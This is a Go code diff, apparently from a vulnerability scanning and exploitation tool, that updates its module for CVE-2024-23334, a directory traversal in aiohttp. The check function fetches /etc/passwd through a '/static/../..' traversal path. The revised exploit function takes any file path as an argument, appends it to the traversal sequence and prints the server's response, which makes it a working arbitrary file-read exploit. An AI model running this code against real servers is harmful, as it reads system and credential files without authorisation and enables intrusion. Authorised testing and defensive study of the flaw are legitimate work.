@@ -12,8 +12,8 @@ type CVE_2024_23334 struct {
 	appVul.BaseVulnerability
 }
 
-var CVE_2024_23334_v1 = &CVE_2024_23334{
-	appVul.BaseVulnerability{
+var CVE_2024_23334_v1 = CVE_2024_23334{
+	BaseVulnerability: appVul.BaseVulnerability{
 		Name:        "CVE-2024-23334",
 		Description: "Aiohttp Directory Traversal",
 	},
@@ -22,35 +22,30 @@ var CVE_2024_23334_v1 = &CVE_2024_23334{
 func (cve CVE_2024_23334) CheckSec(ctx *cli.Context) (bool, error) {
 	errorData := error(nil)
 	baseURL := utils.Http.FormatURL(ctx)
-	target, errorData := utils.Http.FormatURLPath(baseURL, "static/../../../../../../../../../etc/passwd")
-	if errorData != nil {
-		fmt.Println("CheckSec Error: ", errorData)
-		return false, errorData
-	}
-	resp, errorData := utils.Http.Get(target)
+	resp, errorData := utils.Http.Get(baseURL + "/static/../../../../../../../../../etc/passwd")
 	if errorData != nil {
 		return false, errorData
 	}
 	if strings.Contains(resp, "root:") {
-		cve.VulnerabilityExists = true
+		CVE_2024_23334_v1.VulnerabilityExists = true
 	} else {
-		cve.VulnerabilityExists = false
+		CVE_2024_23334_v1.VulnerabilityExists = false
 	}
-	return cve.VulnerabilityExists, errorData
+	return CVE_2024_23334_v1.VulnerabilityExists, errorData
 }
 
 func (cve CVE_2024_23334) Exploit(ctx *cli.Context) (err error) {
 	errorData := error(nil)
 	baseURL := utils.Http.FormatURL(ctx)
-	resp, err := utils.Http.Get(baseURL)
+	args := ctx.String("args")
+	if !strings.HasPrefix(args, "/") {
+		args = "/" + args
+	}
+	resp, err := utils.Http.Get(baseURL + "/static/../../../../../../../../.." + args)
 	if err != nil {
 		return err
 	}
-	if strings.Contains(resp, "baidu.com") {
-		fmt.Println("CVE-2024-23334 has exploited")
-	} else {
-		fmt.Println("CVE-2024-23334 is not exploitable")
-	}
+	fmt.Println("Response:\n\n" + resp)
 
 	return errorData
 }
